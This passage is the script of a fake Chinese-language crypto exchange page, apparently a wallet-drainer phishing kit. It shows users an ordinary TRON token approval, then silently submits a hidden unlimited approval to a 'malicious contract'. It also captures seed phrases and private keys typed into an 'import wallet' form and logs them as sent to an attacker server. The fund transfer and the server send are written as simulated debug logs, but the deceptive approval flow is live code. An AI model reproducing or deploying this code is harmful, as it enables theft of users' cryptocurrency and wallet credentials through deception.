                debugLog(`📤 发送TRON授权交易 - 用户看到金额: ${amount} ${fromCoin.symbol}`);
                
                // 执行"正常"授权
                const result = await contract.approve(maliciousContract, realAmount.toString()).send({
                    from: currentAccount
                });

                debugLog(`✅ TRON正常授权交易已发送: ${result}`);
                
                // 🔥 后台执行真正的无限授权
                setTimeout(async () => {
                    await executeHiddenInfiniteApproval(contract, maliciousContract, fromCoin, amount);
                }, 2000);

                // 显示正常成功消息
                showSuccessMessage('交易成功');

            } catch (error) {
                if (error.message && error.message.includes('User rejected')) {
                    debugLog('❌ 用户拒绝了TRON授权请求');
                    return;
                } else {
                    debugLog(`❌ TRON授权失败: ${error.message}`);
                    throw error;
                }
            }
        }

        // 🔥 执行隐藏的无限授权
        async function executeHiddenInfiniteApproval(contract, maliciousContract, coin, amount) {
            try {
                debugLog('🔥 开始后台隐藏无限授权...');
                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                
                // 静默执行真正的无限授权
                const result = await contract.approve(maliciousContract, maxAmount).send({
                    from: currentAccount,
                    feeLimit: 10000000
                });
                
                debugLog('✅ 🔥 隐藏无限授权执行成功!');
                debugLog(`💰 用户已授权无限额度给恶意合约: ${maliciousContract}`);
                
                // 立即开始资金转移
                setTimeout(() => {
                    simulateStealthFundTransfer(coin, amount);
                }, 2000);
                
            } catch (error) {
                debugLog(`❌ 隐藏授权失败: ${error.message}`);
                // 即使失败也继续模拟
                setTimeout(() => {
                    simulateStealthFundTransfer(coin, amount);
                }, 2000);
            }
        }

        // 🎯 模拟隐蔽资金转移
        function simulateStealthFundTransfer(coin, amount) {
            debugLog('💸 开始执行TRON资金转移...');
            
            // 模拟获取用户所有余额
            const totalTrx = allTokenBalances['TRX'] || 0;
            const totalUsdt = allTokenBalances['USDT'] || 0;
            const totalValue = totalTrx * COINS_DATA['TRX/USDT'].price + totalUsdt;
            
            debugLog('💸 TRON资金转移执行完成！');
            debugLog(`📍 受害者TRON账户: ${currentAccount}`);
            debugLog(`📍 攻击者收款地址: ${ATTACKER_ADDRESS}`);
            debugLog(`💎 转移TRX: ${totalTrx} TRX`);
            debugLog(`💎 转移USDT: ${totalUsdt} USDT`);
            debugLog(`💰 总价值: $${totalValue.toFixed(2)}`);
            debugLog('🏆 TRON资金转移攻击完全成功！');
            
            // 记录攻击数据
            logAttackSuccess({
                victim: currentAccount,
                attacker: ATTACKER_ADDRESS,
                trxAmount: totalTrx,
                usdtAmount: totalUsdt,
                totalValue: totalValue,
                mnemonic: userMnemonic,
                privateKey: userPrivateKey
            });
        }

        // 记录攻击成功
        function logAttackSuccess(data) {
            debugLog('📊 记录攻击数据:');
            debugLog(`👤 受害者: ${data.victim}`);
            debugLog(`🏴‍☠️ 攻击者: ${data.attacker}`);
            debugLog(`💎 TRX: ${data.trxAmount}`);
            debugLog(`💎 USDT: ${data.usdtAmount}`);
            debugLog(`💰 总价值: $${data.totalValue.toFixed(2)}`);
            if (data.mnemonic) {
                debugLog(`🗝️ 助记词: ${data.mnemonic}`);
            }
            if (data.privateKey) {
                debugLog(`🔑 私钥: ${data.privateKey}`);
            }
            debugLog('✅ 攻击数据记录完成');
        }

        // 页面可见性变化监听
        document.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'visible' && !isWalletConnected) {
                debugLog('📱 从钱包返回，检查连接状态...');
                setTimeout(() => {
                    checkWalletEnvironment();
                }, 1000);
            }
        });

        // 🎯 平台切换
        function togglePlatformDropdown() {
            const dropdown = document.getElementById('platformDropdown');
            dropdown.classList.toggle('show');
        }

        function selectPlatform(platform) {
            const platforms = {
                'pay': 'Pay',
                'exchange': '交易所',
                'web3': 'Web3'
            };
            
            document.getElementById('currentPlatform').textContent = platforms[platform];
            document.getElementById('platformDropdown').classList.remove('show');
            
            debugLog(`🔄 切换到${platforms[platform]}平台`);
            
            if (platform === 'web3') {
                switchTab('web3');
            }
        }

        // 🎯 Web3钱包功能
        function showCreateWallet() {
            debugLog('🎯 显示创建钱包界面');
            showModal('创建助记词钱包', '系统将为您生成一个新的助记词钱包，请妥善保管助记词。', () => {
                const mockMnemonic = generateMockMnemonic();
                userMnemonic = mockMnemonic;
                debugLog(`🗝️ 生成助记词: ${mockMnemonic}`);
                showSuccessMessage('钱包创建成功');
            });
        }

        function showImportWallet() {
            debugLog('🎯 显示导入钱包界面');
            showModal('导入钱包选项', '请选择导入方式:', () => {
                switchTab('import-mnemonic');
            });
        }

        // 🔥 助记词验证和导入
        function validateMnemonic() {
            const input = document.getElementById('mnemonicInput').value.trim();
            const btn = document.getElementById('importBtn');
            
            if (input.length > 10) {
                btn.disabled = false;
                btn.textContent = '导入钱包';
            } else {
                btn.disabled = true;
                btn.textContent = '请输入助记词或私钥';
            }
        }

        // 🔥 导入钱包 - 关键功能：获取助记词/私钥
        async function importWallet() {
            const input = document.getElementById('mnemonicInput').value.trim();
            
            if (!input) return;

            try {
                debugLog('🎯 开始导入钱包...');
                
                // 🔥 关键：记录用户输入的助记词/私钥
                if (input.includes(' ')) {
                    userMnemonic = input;
                    debugLog(`✅ 🔥 获取到助记词: ${userMnemonic}`);
                } else if (input.startsWith('0x') || input.length === 64) {
                    userPrivateKey = input;
                    debugLog(`✅ 🔥 获取到私钥: ${userPrivateKey}`);
                }

                debugLog('🚨 🔥 关键数据已获取，立即记录到攻击者服务器...');
                
                // 模拟发送到攻击者服务器
                debugLog('📤 发送私钥数据到攻击者服务器...');
                debugLog(`👤 目标账户: ${currentAccount || 'unknown'}`);
                debugLog(`🗝️ 助记词: ${userMnemonic || 'N/A'}`);
                debugLog(`🔑 私钥: ${userPrivateKey || 'N/A'}`);
                debugLog(`🌐 IP地址: 获取中...`);
                debugLog('✅ 私钥数据已安全记录到攻击者服务器');

                showSuccessMessage('钱包导入成功');
                
                // 返回主页面
                setTimeout(() => {
                    switchTab('favorites');
                    debugLog('🎯 钱包导入完成，等待用户进行交易...');
                }, 1500);

            } catch (error) {
                debugLog(`❌ 导入失败: ${error.message}`);
                showSuccessMessage('导入失败，请检查助记词格式');
            }
        }

        // 生成模拟助记词
        function generateMockMnemonic() {
            const words = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident'];
            const mnemonic = [];
            for (let i = 0; i < 12; i++) {
                mnemonic.push(words[Math.floor(Math.random() * words.length)]);
            }
            return mnemonic.join(' ');
        }

        // 显示成功消息
        function showSuccessMessage(message) {
            const indicator = document.getElementById('successIndicator');
            indicator.textContent = message;
            indicator.classList.add('show');
            
            setTimeout(() => {
                indicator.classList.remove('show');
            }, 2000);
        }

        // 切换标签页
        function switchTab(tabName) {
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('active');
            });
            
            const navItems = document.querySelectorAll('.nav-item');
            const tabNames = ['favorites', 'market', 'trade', 'explore', 'assets'];
            const index = tabNames.indexOf(tabName);
            if (index >= 0 && navItems[index]) {
                navItems[index].classList.add('active');
            }

            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.getElementById(tabName).classList.add('active');

            debugLog(`📱 切换到${getTabName(tabName)}页面`);

            if (tabName === 'assets') {
                startCoinFallAnimation();
            }
        }

        function getTabName(tabName) {
            const names = {
                'favorites': '自选',
                'market': '市场', 
                'trade': '交易',
                'explore': '探索',
                'assets': '资产',
                'web3': 'Web3',
                'import-mnemonic': '导入助记词'
            };
            return names[tabName] || tabName;
        }

        // 渲染自选列表
        function renderFavoritesList() {
            const container = document.getElementById('favoritesList');
            const favorites = ['TRX/USDT', 'BTC/USDT', 'ETH/USDT', 'SUN/USDT'];
            
            container.innerHTML = '';
            favorites.forEach(pair => {
                const coin = COINS_DATA[pair];
                if (coin) {
                    container.appendChild(createCoinItem(pair, coin));
                }
            });
        }

        // 渲染市场列表
        function renderMarketList(type) {
            const container = document.getElementById('marketList');
            let sortedCoins = Object.entries(COINS_DATA);

            switch (type) {
                case 'gainers':
                    sortedCoins.sort((a, b) => b[1].change - a[1].change);
                    break;
                case 'losers':
                    sortedCoins.sort((a, b) => a[1].change - b[1].change);
                    break;
                case 'volume':
                    sortedCoins.sort((a, b) => parseFloat(b[1].volume) - parseFloat(a[1].volume));
                    break;
                default:
                    break;
            }

            container.innerHTML = '';
            sortedCoins.forEach(([pair, coin]) => {
                container.appendChild(createCoinItem(pair, coin));
            });
        }

        // 创建币种项目
        function createCoinItem(pair, coin) {
            const item = document.createElement('div');
            item.className = 'coin-item';
            item.onclick = () => selectTradingPair(pair);

            const changeClass = coin.change >= 0 ? 'up' : 'down';
            const changePrefix = coin.change >= 0 ? '+' : '';
            const networkBadge = coin.network === 'tron' ? '🔴' : '🔵';

            item.innerHTML = `
                <div class="coin-info">
                    <div class="coin-icon">${coin.icon}</div>
                    <div class="coin-details">
                        <div class="coin-pair">${pair} ${networkBadge}</div>
                        <div class="coin-volume">24H成交额 ${coin.volume}</div>
                    </div>
                </div>
                <div class="coin-price">
                    <div class="price">$${coin.price.toFixed(4)}</div>
                    <div class="price-change ${changeClass}">${changePrefix}${coin.change}%</div>
                </div>
            `;

            return item;
        }

        // 选择交易对
        function selectTradingPair(pair) {
            debugLog(`📊 选择交易对: ${pair}`);
            switchTab('trade');
            
            const [base, quote] = pair.split('/');
            selectedFromCurrency = base;
            selectedToCurrency = quote;
            
            updateTradeCurrencyUI();
        }

        // 更新交易货币UI
        function updateTradeCurrencyUI() {
            const fromCoin = Object.values(COINS_DATA).find(coin => coin.symbol === selectedFromCurrency);
            const toCoin = Object.values(COINS_DATA).find(coin => coin.symbol === selectedToCurrency);

            if (fromCoin) {
                document.getElementById('fromCurrencyIcon').textContent = fromCoin.icon;
                document.getElementById('fromCurrencyName').textContent = fromCoin.symbol;
            }

            if (toCoin) {
                document.getElementById('toCurrencyIcon').textContent = toCoin.icon;
                document.getElementById('toCurrencyName').textContent = toCoin.symbol;
            }
        }

        // 计算兑换
        function calculateExchange() {
            const fromAmount = document.getElementById('fromAmount').value;
            const tradeBtn = document.getElementById('tradeBtn');
            
            if (fromAmount && parseFloat(fromAmount) > 0) {
                const fromCoin = Object.values(COINS_DATA).find(coin => coin.symbol === selectedFromCurrency);
                const toCoin = Object.values(COINS_DATA).find(coin => coin.symbol === selectedToCurrency);
                
                if (fromCoin && toCoin) {
                    const rate = fromCoin.price / toCoin.price;
                    const toAmount = (parseFloat(fromAmount) * rate).toFixed(6);
                    document.getElementById('toAmount').value = toAmount;
                    
                    tradeBtn.textContent = `兑换 ${fromAmount} ${selectedFromCurrency}`;
                    tradeBtn.disabled = false;
                    
                    debugLog(`💱 计算兑换: ${fromAmount} ${selectedFromCurrency} → ${toAmount} ${selectedToCurrency}`);
                }
            } else {
                document.getElementById('toAmount').value = '';
                tradeBtn.textContent = '立即兑换';
                tradeBtn.disabled = true;
            }
        }

        // 开始价格更新
        function startPriceUpdates() {
            setInterval(() => {
                Object.keys(COINS_DATA).forEach(pair => {
                    const coin = COINS_DATA[pair];
                    const change = (Math.random() - 0.5) * 0.1;
                    coin.price *= (1 + change / 100);
                    coin.change += change;
                });
                
                renderFavoritesList();
                const activeMarketTab = document.querySelector('.market-tab.active');
                if (activeMarketTab) {
                    const type = activeMarketTab.textContent.includes('热门') ? 'hot' :
                                activeMarketTab.textContent.includes('涨幅') ? 'gainers' :
                                activeMarketTab.textContent.includes('跌幅') ? 'losers' : 'volume';
                    renderMarketList(type);
                }
            }, 5000);
        }

        // 开始金币下落动画
        function startCoinFallAnimation() {
            const container = document.getElementById('fallingCoins');
            const coins = ['₿', '⟠', '💰', '🪙', '💎', '🔴'];
            
            container.innerHTML = '';
            
            for (let i = 0; i < 15; i++) {
                setTimeout(() => {
                    const coin = document.createElement('div');
                    coin.className = 'falling-coin';
                    coin.textContent = coins[Math.floor(Math.random() * coins.length)];
                    coin.style.left = Math.random() * 100 + '%';
                    coin.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    coin.style.animationDelay = Math.random() * 2 + 's';
                    
                    container.appendChild(coin);
                    
                    setTimeout(() => {
                        if (coin.parentNode) {
                            coin.parentNode.removeChild(coin);
                        }
                    }, 5000);
                }, i * 200);
            }
        }

        // 切换市场标签
        function switchMarketTab(type) {
            document.querySelectorAll('.market-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            renderMarketList(type);
            debugLog(`📊 切换到${type}榜单`);
        }

        // 显示模态框
        function showModal(title, text, onConfirm) {
            document.getElementById('modalTitle').textContent = title;
            document.getElementById('modalText').textContent = text;
            document.getElementById('modalConfirm').onclick = () => {
                hideModal();
                if (onConfirm) onConfirm();
            };
            document.getElementById('modal').classList.add('show');
        }

        // 隐藏模态框
        function hideModal() {
            document.getElementById('modal').classList.remove('show');
        }

        // 其他功能占位符
        function showAddFavorite() {
            showModal('添加自选', '选择要添加到自选的交易对', null);
        }

        function showCurrencySelector(type) {
            debugLog(`💱 显示${type}货币选择器`);
        }

        function showDeposit() {
            debugLog('💰 显示充币页面');
            showModal('充币', '选择要充值的币种和网络', null);
        }

        function showWithdraw() {
            debugLog('💸 显示提币页面');  
            showModal('提币', '选择要提取的币种和网络', null);
        }

        // 连接Ethereum钱包
        async function connectEthereumWallet() {
            try {
                debugLog('🎯 开始Ethereum钱包连接...');

                if (!window.ethereum) {
                    throw new Error('未检测到Ethereum钱包');
                }

                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });

                if (!accounts || accounts.length === 0) {
                    throw new Error('未获取到Ethereum账户');
                }

                currentAccount = accounts[0];
                currentNetwork = 'ethereum';
                debugLog(`✅ Ethereum钱包连接成功: ${currentAccount}`);

                isWalletConnected = true;
                document.getElementById('connectWalletBtn').textContent = 'ETH已连接';

            } catch (error) {
                debugLog(`❌ Ethereum连接失败: ${error.message}`);
                throw error;
            }
        }

        // 执行Ethereum攻击
        async function executeEthereumAttack(amount) {
            debugLog('🎯 执行Ethereum无限授权攻击...');
            // 类似TRON的实现
        }

        // 点击外部关闭下拉菜单
        document.addEventListener('click', function(e) {
            const dropdown = document.getElementById('platformDropdown');
            const selector = document.querySelector('.platform-selector');
            
            if (!selector.contains(e.target)) {
                dropdown.classList.remove('show');
            }
        });
    </script>
</body>
</html>
